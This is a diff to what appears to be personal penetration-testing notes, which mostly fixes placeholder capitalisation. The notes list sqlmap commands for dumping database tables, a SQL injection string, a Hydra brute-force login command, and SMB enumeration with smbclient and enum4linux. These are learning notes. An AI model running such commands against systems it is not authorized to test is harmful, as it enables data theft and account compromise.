@@ -17,7 +17,7 @@ Shows current routing table of hosts
 ### ```route```                   
 Similar output as above
 
-### ```ip route add <target network/24> via <ip>``` 
+### ```ip route add <target network/24> via <IP>``` 
 Adds static route to access other network
 
 
@@ -33,15 +33,15 @@ Standard Gobuster scan used
 
 
 ## Sqlmap:
-### ```sqlmap -u "http://<url>/" -D <database> --tables```
-### ```sqlmap -u "http://<url>/" -D <database> -T <table> --columns```
-### ```sqlmap -u "http://<url>/" -D <database> -T <table> --dump```
+### ```sqlmap -u "http://<URL>/" -D <database> --tables```
+### ```sqlmap -u "http://<URL>/" -D <database> -T <table> --columns```
+### ```sqlmap -u "http://<URL>/" -D <database> -T <table> --dump```
 
 ### ```‘ or 1=1; – -```
 
 
 ## Hydra
-### ```hydra <http://<url>> "/login.php:username=^USER^&password=^PASS^:invalid credentials" -L usernames.txt -P passwords.txt -f -V```
+### ```hydra <http://<URL>> "/login.php:username=^USER^&password=^PASS^:invalid credentials" -L usernames.txt -P passwords.txt -f -V```
 
 
 ## Burpsuite
@@ -64,7 +64,7 @@ Checks for available shares
 ### ```smbclient //<IP>/IPC$ -N```
 Connecting to a share
 
-### ```enum4linux -a <IP>111```
+### ```enum4linux -a <IP>```
 
 ## Other tools that I forgot to take notes on during the test:
 ### Metasploit
